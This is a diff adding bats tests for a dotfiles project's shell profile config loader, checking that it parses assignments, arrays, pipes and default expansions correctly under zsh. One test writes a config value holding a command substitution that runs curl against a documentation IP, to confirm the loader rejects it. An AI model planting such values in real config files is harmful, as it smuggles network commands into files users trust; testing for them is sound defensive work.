@@ -531,3 +531,58 @@ EOF
     assert_failure
     assert_output --partial "not found"
 }
+
+# .zshrc sources lib/profiles.sh, so the core helpers must also parse in zsh.
+@test "the unquoted-pipe check works when sourced by zsh" {
+    command -v zsh >/dev/null || skip "zsh not installed"
+    run zsh -f -c "export DOTFILES='$PROJECT_ROOT'; source '$PROJECT_ROOT/lib/profiles/core.sh'
+        _profile_conf_has_unquoted_pipe 'a | b' && echo pipe
+        _profile_conf_has_unquoted_pipe \"x '|' y\" || echo quoted"
+    [ "$status" -eq 0 ]
+    [[ "$output" == *pipe*quoted* ]]
+    [[ "$output" != *"unrecognized modifier"* ]]
+}
+
+# zsh mirrors of the safe loader tests (.zshrc runs profile_load in zsh).
+zprof() {
+    run zsh -f -c "export DOTFILES='$PROJECT_ROOT'; source '$PROJECT_ROOT/lib/profiles/core.sh'; $1"
+}
+
+@test "zsh: _profile_load_conf_file loads scalar KEY=value assignments" {
+    command -v zsh >/dev/null || skip "zsh not installed"
+    printf '# c\nGIT_NAME="Test User"\nGIT_EMAIL='"'"'test@example.com'"'"'\nGIT_GPG_FORMAT=ssh\n' > "$TEST_DIR/z.conf"
+    zprof "_profile_load_conf_file '$TEST_DIR/z.conf' && print -r -- \"\$GIT_NAME|\$GIT_EMAIL|\$GIT_GPG_FORMAT\""
+    [ "$status" -eq 0 ]
+    [ "$output" = "Test User|test@example.com|ssh" ]
+}
+
+@test "zsh: _profile_load_conf_file loads GCLOUD_PROJECTS array entries" {
+    command -v zsh >/dev/null || skip "zsh not installed"
+    printf 'GCLOUD_ACCOUNT="jane@example.com"\nGCLOUD_PROJECTS=(\n    "proj-a|Project A"\n    "proj-b|Project B"\n)\n' > "$TEST_DIR/zg.conf"
+    zprof "GCLOUD_PROJECTS=(); _profile_load_conf_file '$TEST_DIR/zg.conf' && print -r -- \"\$GCLOUD_ACCOUNT|\${#GCLOUD_PROJECTS[@]}|\${GCLOUD_PROJECTS[1]}|\${GCLOUD_PROJECTS[2]}\""
+    [ "$status" -eq 0 ]
+    [ "$output" = "jane@example.com|2|proj-a|Project A|proj-b|Project B" ]
+}
+
+@test "zsh: _profile_load_conf_file rejects command substitution" {
+    command -v zsh >/dev/null || skip "zsh not installed"
+    printf 'GIT_NAME="$(curl http://192.0.2.1/x)"\n' > "$TEST_DIR/zb.conf"
+    zprof "_profile_load_conf_file '$TEST_DIR/zb.conf'"
+    [ "$status" -ne 0 ]
+}
+
+@test "_profile_conf_expand_value: \${VAR:-default} uses the default or the set value (bash)" {
+    unset BH_EXPAND_X
+    [ "$(_profile_conf_expand_value '${BH_EXPAND_X:-ghostty}')" = "ghostty" ]
+    BH_EXPAND_X=kitty
+    [ "$(_profile_conf_expand_value '${BH_EXPAND_X:-ghostty}')" = "kitty" ]
+    BH_EXPAND_X=""
+    [ "$(_profile_conf_expand_value '${BH_EXPAND_X-ghostty}')" = "" ]
+}
+
+@test "zsh: _profile_conf_expand_value handles \${VAR:-default} and \${VAR-default}" {
+    command -v zsh >/dev/null || skip "zsh not installed"
+    zprof "unset BH_EXPAND_X; a=\$(_profile_conf_expand_value '\${BH_EXPAND_X:-ghostty}'); BH_EXPAND_X=kitty; b=\$(_profile_conf_expand_value '\${BH_EXPAND_X:-ghostty}'); BH_EXPAND_X=''; c=\$(_profile_conf_expand_value '\${BH_EXPAND_X-ghostty}'); print -r -- \"\$a|\$b|\$c|\""
+    [ "$status" -eq 0 ]
+    [ "$output" = "ghostty|kitty||" ]
+}
